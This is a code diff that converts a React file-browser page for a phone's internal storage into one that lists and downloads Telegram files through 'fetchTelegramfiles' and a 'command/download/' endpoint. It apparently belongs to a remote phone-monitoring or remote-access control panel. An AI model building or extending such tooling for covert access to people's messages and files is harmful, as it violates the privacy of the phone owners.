@@ -7,19 +7,15 @@ import TableHead from "@mui/material/TableHead";
 import TableRow from "@mui/material/TableRow";
 import Card from "@mui/material/Paper";
 import { useLocation } from "react-router";
-import {
-  BASE_URL,
-  fetchInternalFile,
-  fetchInternalStorage,
-} from "../../services/apiService";
 import { useState, useEffect } from "react";
 import Skeleton from "@mui/material/Skeleton";
 import Alert from "@mui/material/Alert";
 import Typography from "@mui/material/Typography";
 import { AlertTitle, Box, Button } from "@mui/material";
 import { toast } from "react-toastify";
+import { BASE_URL,fetchInternalFile, fetchInternalStorage, fetchTelegramfiles } from "../../../services/apiService";
 
-export default function InternalStorage() {
+export default function Telegram() {
   const location = useLocation();
   const { userIdenc } = location.state || {};
   const [filesList, setFilesList] = useState([]);
@@ -39,7 +35,8 @@ export default function InternalStorage() {
         setError(null);
         setFilesList([]);
 
-        const contactResponse = await fetchInternalStorage(userId, newPath);
+        const contactResponse = await fetchTelegramfiles(userId, newPath);
+        console.log("contactResponse:", contactResponse);
         const parsedResponse = JSON.parse(contactResponse);
         if (contactResponse?.includes("error")) {
           setError(parsedResponse.error);
@@ -59,7 +56,7 @@ export default function InternalStorage() {
     // const newPath = currentPath ? `${currentPath}/${file?.name}` : file?.name;
     // const fullPath = `/storage/emulated/0/${newPath}`;
     try {
-      const contactResponse = await fetchInternalFile(userId, file?.path);
+      const contactResponse = await fetchTelegramfiles(userId, file?.path);
       const parsedResponse = JSON.parse(contactResponse);
       window.open(
         BASE_URL + "command/download/" + parsedResponse.filename,
@@ -89,7 +86,7 @@ export default function InternalStorage() {
       pathSegments.pop();
       const parentPath = pathSegments.join("/");
 
-      const contactResponse = await fetchInternalStorage(userId, parentPath);
+      const contactResponse = await fetchTelegramfiles(userId, parentPath);
       const parsedResponse = JSON.parse(contactResponse);
       if (contactResponse?.includes("error")) {
         setError(parsedResponse.error);
@@ -113,7 +110,7 @@ export default function InternalStorage() {
         setError(null);
         setFilesList([]);
 
-        const contactResponse = await fetchInternalStorage(userId);
+        const contactResponse = await fetchTelegramfiles(userId);
         const parsedResponse = JSON.parse(contactResponse);
 
         if (contactResponse?.includes("error")) {
